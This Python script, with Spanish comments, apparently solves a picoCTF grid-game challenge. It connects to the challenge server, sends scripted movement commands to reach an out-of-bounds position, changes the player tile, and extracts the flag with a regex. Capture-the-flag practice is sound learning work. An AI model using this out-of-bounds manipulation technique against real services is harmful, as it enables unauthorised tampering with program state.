import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.3)
s.recv(8192)

print("Enviando comandos en bloque...\n")

# Construir secuencia completa
commands = []

# Ir a (0, 86)
commands.extend(['w'] * 4)   # row: 4 -> 0
commands.extend(['d'] * 82)  # col: 4 -> 86

# Comando 'l' + carácter
commands.append('l')

# Enviar todos los comandos excepto el último
cmd_str = '\n'.join(commands) + '\n'
s.send(cmd_str.encode())
time.sleep(2)

# Ahora enviar el carácter para 'l'
s.send(b'b')
time.sleep(0.3)

# Mover arriba
s.send(b'w\n')
time.sleep(1)

# Recibir toda la respuesta
all_data = b''
for i in range(5):
    try:
        s.settimeout(0.5)
        chunk = s.recv(8192)
        all_data += chunk
    except:
        break

text = all_data.decode(errors='ignore')

if 'flag: 1' in text or 'Player has flag: 1' in text:
    print("¡FLAG ACTIVADA!")
    s.send(b'p\n')
    time.sleep(3)
    
    final_data = b''
    for i in range(10):
        try:
            s.settimeout(0.5)
            chunk = s.recv(8192)
            final_data += chunk
        except:
            break
    
    final_text = final_data.decode(errors='ignore')
    match = re.search(r'picoCTF\{[^}]+\}', final_text)
    if match:
        print(f"\nFLAG: {match.group()}")
else:
    print("No activado. Últimas líneas:")
    lines = text.split('\n')
    for line in lines[-20:]:
        if 'Player' in line or 'flag' in line or '@' in line:
            print(line)

s.close()
